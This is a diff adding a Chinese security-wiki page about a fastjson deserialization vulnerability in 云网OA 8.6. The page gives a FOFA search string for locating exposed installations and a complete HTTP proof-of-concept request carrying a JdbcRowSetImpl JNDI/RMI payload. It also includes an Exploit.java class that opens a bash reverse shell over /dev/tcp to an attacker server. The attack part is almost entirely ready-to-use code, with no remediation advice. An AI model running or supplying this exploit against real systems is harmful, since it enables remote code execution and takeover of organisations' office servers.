@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%91%E7%BD%91OA/%E4%BA%91%E7%BD%91OA8.6%E5%AD%98%E5%9C%A8fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>云网OA8.6存在fastjson反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4e91\u7f51OA8.6\u5b58\u5728fastjson\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+              {title: "Exploit.java", url: "#exploitjava" },
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28DVB-2024-6594%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28DVB-2024-6594%29/" class="btn btn-xs btn-link">
+        云课网校系统文件上传漏洞(DVB-2024-6594)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fgpy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fgpy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        云时空社会化商业ERP系统gpy任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="oa86fastjson">云网OA8.6存在fastjson反序列化漏洞<a class="headerlink" href="#oa86fastjson" title="Permanent link">&para;</a></h2>
+<p>云网OA8.6使用fastjson1.2.37造成反序列化漏洞</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>&quot;云网OA&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /oa//setup/updateUiSetup HTTP/1.1
+Host: 192.168.0.7:8096
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: skincode=lte; name=admin; pwd=; JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 196
+
+uiSetup={&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1389/Exploit&quot;, &quot;autoCommit&quot;:true}}
+</code></pre></div>
+<img alt="a8ac139413588a49d844ca534afce1ed" src="https://github.com/wy876/POC/assets/139549762/773d195f-9171-4783-956b-4db556f93aae" /></p>
+<p><img alt="bb988d242c8d788aca44bd3e22f2650b" src="https://github.com/wy876/POC/assets/139549762/15be1a39-4102-4864-8cae-71e21e56187b" /></p>
+<h3 id="exploitjava">Exploit.java<a class="headerlink" href="#exploitjava" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>public class Exploit {
+    public Exploit(){
+        try {
+            java.lang.Runtime.getRuntime().exec(
+                    new String[]{&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/服务器IP/12345 0&gt;&amp;1&quot;});
+        }
+        catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
+</code></pre></div>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/KNE7khKhG9-FLTJK73ZfNQ">https://mp.weixin.qq.com/s/KNE7khKhG9-FLTJK73ZfNQ</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28DVB-2024-6594%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28DVB-2024-6594%29/" class="btn btn-xs btn-link">
+        云课网校系统文件上传漏洞(DVB-2024-6594)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fgpy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fgpy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        云时空社会化商业ERP系统gpy任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
